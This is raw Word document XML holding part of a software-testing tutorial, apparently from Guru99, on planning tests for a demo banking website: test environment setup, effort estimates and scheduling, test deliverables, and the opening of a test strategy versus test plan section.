                  <w:tcW w:w="1032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need a Network include LAN and Internet to simulate the real business and user environment</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="147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4.     </w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1093"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Computer</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1032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EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">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PC which users often use to connect the web server</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading4"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="216" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Step 6) Plan Test Environment</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading4"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="216" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>What is the Test Environment</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>A testing environment is a setup of software and hardware on which the testing team is going to execute test cases. The test environment consists of </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>real business</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> and </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>user</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> environment, as well as physical environments, such as server, front end running environment.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading4"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="216" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>How to setup the Test Environment</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Back to your project, how do you set up </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>test environment</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> for this banking website?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>To finish this task, you need </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>a strong cooperation</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> between Test Team and Development Team</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You should ask the developer some questions to understand the web application under test </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>clearly</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>. Here’re some recommended questions. Of course, you can ask the other questions if you need.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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What is the maximum user connection which this website can handle at the same time?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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What are hardware/software requirements to install this website?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Does the user's computer need any particular setting to browse the website?</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Following figure describes the test environment of the banking website </w:t>
            </w:r>
            <w:hyperlink r:id="rId60" w:history="1">
              <w:r w:rsidRPr="00E97930">
                <w:rPr>
                  <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="0000FF"/>
                </w:rPr>
                <w:t>www.demo.guru99.com/V4</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">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Step 7) Schedule &amp; Estimation</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In the article </w:t>
            </w:r>
            <w:hyperlink r:id="rId61" w:history="1">
              <w:r w:rsidRPr="00E97930">
                <w:rPr>
                  <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="40A2B5"/>
                </w:rPr>
                <w:t>Test estimation</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>, you already used some techniques to estimate the effort to complete the project. Now you should include that estimation as well as the schedule to the Test Planning</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In the Test Estimation phase, suppose you break out the whole project into small tasks and add the estimation for each task as below</w:t>
            </w:r>
          </w:p>
          <w:tbl>
            <w:tblPr>
              <w:tblW w:w="8804"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0"/>
              <w:gridCol w:w="1662"/>
              <w:gridCol w:w="4962"/>
            </w:tblGrid>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="163"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="2180"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Task</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1662"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Members</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="4962"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Estimate effort</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidTr="00BC3F7A">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Create the test specification</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Designer</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170 man-hour</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="163"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="2180"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Perform Test Execution</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="16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Tester, Test Administrator</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="49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80 man-hour</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="163"/>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Report</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Tester</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10 man-hour</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidTr="00BC3F7A">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Delivery</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="16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 </w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="49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20 man-hour</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidTr="00BC3F7A">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Total</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 </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EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">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280 man-hour</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>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Then you create the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>schedule</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> to complete these tasks.</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Making schedule is a common term in project management. By creating a solid schedule in the Test Planning, the Test Manager can use it as tool for monitoring the project progress, control the cost overruns.</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To create the project schedule, the Test Manager needs several types of input as below:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Employee and project deadline</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>: The working days, the project deadline, resource availability are the factors which affected to the schedule</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Project estimation</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>:  Base on the estimation, the Test Manager knows how long it takes to complete the project. So he can make the appropriate project schedule</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Project Risk </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve">: Understanding the risk helps Test Manager add enough extra time to the project </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>schedule to deal with the risks</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Let’s practice with an example:</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Suppose the boss wants to complete the project Guru99 in </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>one</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> month, you already estimated the effort for each tasks in Test Estimation. You can create the schedule as below</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noProof/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00976845" wp14:editId="4B87C102">
                  <wp:extent cx="5943600" cy="17191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943600" cy="1719136"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln w="9525">
                            <a:noFill/>
                            <a:miter lim="800000"/>
                            <a:headEnd/>
                            <a:tailEnd/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading4"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="216" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Step 8) Test Deliverables</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Test Deliverables is a list of all the documents, tools and other components that has to be developed and maintained in support of the testing effort.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>There are different test deliverables at every phase of the software development lifecycle.</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before</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> testing phase.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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plans document.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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cases documents</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Design specifications.</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during</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> the testing</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Scripts</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Simulators.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Data</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Traceability Matrix</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Error logs and execution logs.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">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after</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> the testing cycles is over.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Results/reports</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Defect Report</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Installation/ Test procedures guidelines</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Release notes</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading1"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">Test Strategy </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Vs</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> Test Plan</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading4"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="216" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
                <w:sz w:val="27"/>
                <w:szCs w:val="27"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
                <w:sz w:val="27"/>
                <w:szCs w:val="27"/>
              </w:rPr>
              <w:t>What is Test Plan?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>A test plan is defined as a document which outlines the scope, objective, method and weight on a software testing task</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading4"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="216" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
                <w:sz w:val="27"/>
                <w:szCs w:val="27"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
                <w:sz w:val="27"/>
                <w:szCs w:val="27"/>
              </w:rPr>
              <w:t>What is Test Strategy?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Test strategy is defined as a set of guiding principle that enlightens test design &amp; regulates how testing needs to be done</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Test Plan V/s Test Strategy is a prominent confusion among multiple levels of QA Aspirants</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Below is the detailed guide to it</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="343434"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading3"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="372" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
                <w:sz w:val="33"/>
                <w:szCs w:val="33"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="343434"/>
                <w:sz w:val="33"/>
                <w:szCs w:val="33"/>
              </w:rPr>
